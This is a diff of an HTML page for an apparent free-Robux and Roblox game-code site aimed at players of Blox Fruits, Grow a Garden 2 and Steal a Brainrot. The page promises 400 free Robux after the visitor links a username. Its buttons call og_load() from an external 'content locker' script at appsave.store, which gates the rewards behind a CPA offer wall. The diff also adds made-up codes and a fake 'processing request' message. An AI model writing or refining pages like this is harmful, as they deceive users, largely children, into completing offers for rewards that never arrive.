@@ -118,6 +118,7 @@
             border-color: var(--accent-color);
         }
 
+        /* Local High Quality Images Link Connection */
         .card img {
             width: 100%;
             height: 160px;
@@ -133,10 +134,19 @@
             margin-top: 0;
             color: var(--accent-color);
         }
-    </style>
 
-    <!-- Your External Content Locker Script Integrated Here -->
-    <script type="text/javascript" id="ogjs" src="https://appsave.store"></script>
+        .code-display {
+            background-color: #111;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 18px;
+            color: var(--gold-color);
+            margin: 15px 0;
+            border: 1px dashed var(--gold-color);
+            display: none; /* Hidden until username is connected */
+        }
+    </style>
 </head>
 <body>
 
@@ -161,49 +171,55 @@
             
             <!-- Get Robux Section -->
             <div class="card">
-                <img src="https://unsplash.com" alt="Robux">
+                <img src="robux.jpg" alt="Robux">
                 <div class="card-content">
                     <h3>💎 Claim Free Robux</h3>
                     <p>Instantly request 400 Robux to be sent to your linked account.</p>
-                    <button class="btn" onclick="triggerLocker('Robux')">Claim Robux</button>
+                    <button class="btn" onclick="claimRobux()">Claim Robux</button>
                 </div>
             </div>
 
             <!-- Blox Fruits Codes -->
             <div class="card">
-                <img src="https://unsplash.com" alt="Blox Fruits">
+                <img src="bloxfruits.jpg" alt="Blox Fruits">
                 <div class="card-content">
                     <h3>⚔️ Blox Fruits Codes</h3>
                     <p>Get double experience boosts and status reset codes.</p>
-                    <button class="btn" onclick="triggerLocker('Blox Fruits Codes')">Reveal Code</button>
+                    <div id="code-blox" class="code-display">EXP_BOOST2026</div>
+                    <button class="btn" onclick="showCode('code-blox')">Reveal Code</button>
                 </div>
             </div>
 
             <!-- Grow a Garden 2 Codes -->
             <div class="card">
-                <img src="https://unsplash.com" alt="Grow a Garden 2">
+                <img src="garden.jpg" alt="Grow a Garden 2">
                 <div class="card-content">
                     <h3>🌱 Grow a Garden 2</h3>
                     <p>Unlock rare seeds, unique speed boosts, and tools.</p>
-                    <button class="btn" onclick="triggerLocker('Grow a Garden 2 Codes')">Reveal Code</button>
+                    <div id="code-garden" class="code-display">GARDEN_FREE55</div>
+                    <button class="btn" onclick="showCode('code-garden')">Reveal Code</button>
                 </div>
             </div>
 
             <!-- Steal a Brainrot Codes -->
             <div class="card">
-                <img src="https://unsplash.com" alt="Steal a Brainrot">
+                <img src="steer.jpg" alt="Steal a Brainrot">
                 <div class="card-content">
                     <h3>🧠 Steal a Brainrot</h3>
                     <p>Unlock free in-game memes, coins, and funny avatars.</p>
-                    <button class="btn" onclick="triggerLocker('Steal a Brainrot Codes')">Reveal Code</button>
+                    <div id="code-brainrot" class="code-display">SIGMA_ROT99</div>
+                    <button class="btn" onclick="showCode('code-brainrot')">Reveal Code</button>
                 </div>
             </div>
 
         </div>
     </div>
 
+    <!-- كود الـ Script الخاص بك مدمج هنا ليعمل عند استدعائه -->
+    <script type="text/javascript" id="ogjs" src="https://appsave.store/cl/js/m53x2w"></script>
+
     <script>
-        // Username Validation
+        // Form Validation & Logic
         function connectUser() {
             const username = document.getElementById('username').value;
             if (username.trim() === "") {
@@ -213,24 +229,34 @@
             }
         }
 
-        // Centralized Function to Handle the Button Clicks and Script Execution
-        function triggerLocker(rewardType) {
+        function claimRobux() {
             const username = document.getElementById('username').value;
-            
-            // Check if the user filled out the username field first
             if (username.trim() === "") {
-                alert(`Please connect your username above to unlock ${rewardType}!`);
+                alert("You must enter and link your username first!");
+            } else {
+                // استدعاء الكود الخاص بك مباشرة ليفتح القفل للمستخدم
+                if (typeof og_load === "function") {
+                    og_load();
+                } else {
+                    alert(`Processing request for: ${username}... Please complete the verification.`);
+                }
+            }
+        }
+
+        function showCode(codeId) {
+            const username = document.getElementById('username').value;
+            if (username.trim() === "") {
+                alert("Please connect your username above to unlock game codes!");
                 return;
             }
             
-            // Check if the CPA network's function is ready to load
+            // استدعاء الكود الخاص بك هنا أيضاً قبل إظهار الأكواد
             if (typeof og_load === "function") {
                 og_load();
-            } else {
-                // Fallback action if the script is blocked by an extension or slow to load
-                alert("Loading your offer... If the screen does not appear, please disable ad blockers.");
-                window.location.href = "https://appsave.store";
             }
+            
+            const codeDiv = document.getElementById(codeId);
+            codeDiv.style.display = "block";
         }
     </script>
 
